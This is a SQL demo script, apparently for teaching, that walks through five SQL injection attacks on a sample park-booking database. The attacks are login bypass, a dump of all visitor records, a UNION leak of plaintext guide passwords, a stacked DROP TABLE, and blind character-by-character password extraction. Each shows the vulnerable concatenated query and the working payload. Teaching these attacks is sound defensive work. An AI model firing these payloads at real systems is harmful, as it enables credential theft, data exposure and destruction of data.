-- DEMO ONLY: run on the sample database. Each block shows the vulnerable
-- query the app builds, then what the attacker sends.

USE gorilla_park;

/* ATTACK 1: Authentication bypass (guide login)
   App code:  "SELECT * FROM guides WHERE username='" + u + "' AND password_plain='" + p + "'"
   Attacker username:  admin' --
   Resulting query: */
SELECT * FROM guides WHERE username='admin' -- ' AND password_plain='anything';

/* Variant: ' OR '1'='1 */
SELECT * FROM guides WHERE username='x' OR '1'='1' AND password_plain='x' OR '1'='1';

/* ATTACK 2: Data leak (booking lookup by passport)
   App code:  "SELECT full_name,email FROM visitors WHERE passport_no='" + input + "'"
   Attacker input:  ' OR 1=1 --
   Resulting query: dumps all visitors */
SELECT full_name,email FROM visitors WHERE passport_no='' OR 1=1 -- ';

/* ATTACK 3: UNION-based extraction (permit search by family name)
   App code:  "SELECT permit_no,status FROM permits WHERE permit_no LIKE '%" + input + "%'"
   Attacker input:  x%' UNION SELECT username, password_plain FROM guides -- 
   Resulting query: leaks guide credentials through the permit search box */
SELECT permit_no,status FROM permits WHERE permit_no LIKE '%x%' UNION SELECT username, password_plain FROM guides -- %';

/* ATTACK 4: Stacked query (booking status update)
   App code:  "UPDATE bookings SET paid=1 WHERE booking_id=" + input
   Attacker input:  1; DROP TABLE bookings; --
   Resulting query: updates row 1, then drops the whole table */
UPDATE bookings SET paid=1 WHERE booking_id=1; DROP TABLE bookings; -- ;

/* ATTACK 5: Blind boolean-based injection (permit validity check)
   App code:  "SELECT 1 FROM permits WHERE permit_no='" + input + "' AND status='valid'"
   Attacker probes one char at a time:
   RDB-0001' AND SUBSTRING((SELECT password_plain FROM guides WHERE username='admin'),1,1)='A' -- */
SELECT 1 FROM permits WHERE permit_no='RDB-0001' AND SUBSTRING((SELECT password_plain FROM guides WHERE username='admin'),1,1)='A' -- ' AND status='valid';